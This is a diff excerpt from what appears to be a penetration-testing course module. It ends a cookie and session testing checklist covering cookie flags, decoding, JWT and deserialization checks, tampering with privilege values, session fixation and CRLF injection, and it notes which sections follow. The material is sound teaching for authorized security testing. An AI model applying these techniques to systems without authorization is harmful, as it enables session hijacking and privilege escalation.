+  □ Are HttpOnly, Secure, and SameSite flags set correctly?
+  □ Is the Domain scope appropriate (not overly broad)?
+  □ Decode the cookie value (Base64, URL decode)
+  □ Is it a JWT? → Apply JWT testing methodology
+  □ Is it serialized data? → Test for deserialization vulnerabilities
+  □ Does it contain role, privilege, or user identification data?
+     → Test by modifying to higher privilege values
+  □ Regenerated after login? (Test session fixation)
+  □ Invalidated server-side after logout? (Test with replay)
+
+□ Test for CRLF injection if any user input appears in headers
+□ Check cookie scope vs. application architecture
+```
+
+---
+
+*— Sections 6.7, 6.8, 6.9, and 6.10 are complete. Module 6 continues with Section 6.11: Exploiting File Inclusion Vulnerabilities, 6.12: Exploiting Insecure Code Practices, and 6.13: Summary. —*
 
 ---
